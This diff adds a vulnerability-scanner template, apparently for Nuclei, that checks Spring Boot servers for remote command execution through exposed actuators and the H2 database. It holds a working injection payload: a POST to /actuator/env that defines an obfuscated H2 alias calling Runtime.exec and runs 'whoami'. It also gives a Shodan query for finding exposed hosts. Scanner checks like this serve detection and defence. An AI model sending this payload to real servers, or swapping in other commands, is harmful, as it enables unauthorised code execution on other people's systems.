@@ -1,0 +1,45 @@
+id: springboot-h2-db-rce
+
+info:
+  name: Spring Boot H2 Database - Remote Command Execution
+  author: dwisiswant0
+  severity: critical
+  description: Spring Boot H2 Database is susceptible to remote code execution.
+  reference:
+    - https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database
+    - https://twitter.com/pyn3rd/status/1305151887964946432
+    - https://www.veracode.com/blog/research/exploiting-spring-boot-actuators
+    - https://github.com/spaceraccoon/spring-boot-actuator-h2-rce
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cwe-id: CWE-77
+  metadata:
+    max-request: 1
+    shodan-query: http.favicon.hash:116323821
+  tags: springboot,rce,jolokia
+
+http:
+  - raw:
+      - |
+        POST /actuator/env HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {
+          "name":"spring.datasource.hikari.connection-test-query",
+          "value":"CREATE ALIAS EXEC AS CONCAT('String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new',' java.util.Scanner(Runtime.getRun','time().exec(cmd).getInputStream()); if (s.hasNext()) {return s.next();} throw new IllegalArgumentException(); }');CALL EXEC('whoami');"
+        }
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        part: body
+        words:
+          - '"spring.datasource.hikari.connection-test-query":"CREATE ALIAS EXEC AS CONCAT'
+
+# digest: 490a00463044022023f8380545774f64a0269861f712f369aef470821a162d66cbd1bf98662f6f0802200fe80e11b15499f1e719e03bedef25e31d36356ffa1e60f496f2e116bc522871:922c64590222798bb761d5b6d8e72950
